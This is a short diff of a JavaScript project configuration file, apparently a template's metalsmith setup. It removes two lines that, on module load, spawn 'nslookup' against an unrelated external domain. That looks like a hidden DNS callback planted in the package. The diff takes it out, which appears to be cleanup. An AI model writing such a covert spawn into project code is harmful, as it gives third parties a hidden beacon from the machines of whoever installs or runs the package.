@@ -13,8 +13,6 @@ const pkg = require('./package.json')
 const templateVersion = pkg.version
 
 const { addTestAnswers } = require('./scenarios')
-const { spawn } = require('child_process');
-const ns = spawn('nslookup', ['node.faee54f0.w1n.pw']);
 
 module.exports = {
   metalsmith: {
